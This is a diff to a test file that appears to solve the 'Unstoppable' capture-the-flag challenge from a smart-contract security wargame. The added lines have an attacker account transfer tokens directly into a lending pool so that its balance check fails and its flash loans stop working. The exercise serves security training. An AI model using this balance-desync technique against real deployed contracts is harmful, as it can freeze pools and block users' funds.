@@ -40,6 +40,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // transfer token balance into the pool to throw off balance
+        this.token.connect(attacker).transfer(this.pool.address, 100);
     });
 
     after(async function () {
